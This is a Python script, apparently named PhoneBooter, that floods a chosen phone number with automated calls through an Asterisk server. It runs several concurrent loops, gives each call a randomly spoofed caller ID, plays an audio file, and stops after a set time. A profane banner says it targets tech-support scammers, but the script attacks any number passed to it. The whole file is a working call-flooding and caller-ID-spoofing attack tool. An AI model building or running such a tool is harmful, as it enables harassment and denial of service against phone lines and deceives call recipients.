import asyncio
import argparse
from panoramisk.call_manager import CallManager
from libs.generaterandoms import GenerateRandoms


@asyncio.coroutine
def originate(targetNum, wav):
    callmanager = CallManager(host='127.0.0.1',
                              port=5038,
                              ssl=False,
                              encoding='utf8')

    yield from callmanager.connect()

    auth = yield from callmanager.send_action({'Action': 'login',
                                               'Username': 'test',
                                               'Secret': 'password'})

    # if successful, auth.response returns "Success"
    if auth.response != 'Success':
        print("Failed to login!")
        return

    while True:
        random_number = GenerateRandoms('en_US').phone_number()
        print("Calling with number: %s" % random_number)
        call = yield from callmanager.send_originate({
            'Action': 'Originate',
            'Channel': 'SIP/flowroute/{num}'.format(num=targetNum),
            'WaitTime': 20,
            'CallerID': '{idnum}'.format(idnum=random_number),
            'Application': 'Playback',
            'Data': '{wav}'.format(wav=wav)})

        while not call.queue.empty():
            event = call.queue.get_nowait()
            print(event)
        while True:
            event = yield from call.queue.get()
            print(event)
            if event.event.lower() == 'hangup' and event.cause in ('0', '17'):
                break
        callmanager.clean_originate(call)
        
        callmanager.close()



async def stop_after(loop, when):
    await asyncio.sleep(when)
    loop.stop()


def main(targetNum, numThreads, bootLength, wav):
    """Run an attack for the specified number of seconds against the target."""
    loop = asyncio.get_event_loop()
    for x in list(range(numThreads)):
        loop.create_task(originate(targetNum, wav))

    loop.create_task(stop_after(loop, bootLength))

    # loop.run_until_complete(originate(targetNum))
    loop.run_forever()
    loop.close()


if __name__ == '__main__':

    banner = """
    
  _____  _                      ____              _            
 |  __ \| |                    |  _ \            | |           
 | |__) | |__   ___  _ __   ___| |_) | ___   ___ | |_ ___ _ __ 
 |  ___/| '_ \ / _ \| '_ \ / _ \  _ < / _ \ / _ \| __/ _ \ '__|
 | |    | | | | (_) | | | |  __/ |_) | (_) | (_) | ||  __/ |   
 |_|    |_| |_|\___/|_| |_|\___|____/ \___/ \___/ \__\___|_|   
                                                               
                                                               
    FUCKING MICROSOFT SUPPORT SCAMMING PIECES OF SHIT!
    ex. usage: phonebooter.py -p <number> -l 600 -s ducktales
    """
    print(banner)
    parser = argparse.ArgumentParser(description='PhoneBooter CLI')
    parser.add_argument('-p', '--phonenumber', action='store', dest='targetNum', required=True,
                        help='Specify the target phone number to attack. Example: 18001234567')
    parser.add_argument('-l', '--length', action='store', dest='bootLength', required=True,
                        help='Length of time in seconds to run the phone')
    parser.add_argument('-s', '--sound', action='store', dest='wav',
                        help='Specify the *.ulaw file to play. Store it under /usr/share/asterisk/sounds. '
                             'Do not include the extension', default='hello-world')
    parser.add_argument('-t', '--threads', action='store', dest='threads',
                        help='Number of async processes to kick off. Default is 8.', default=8)
    args = parser.parse_args()

    main(args.targetNum, int(args.threads), int(args.bootLength), args.wav)
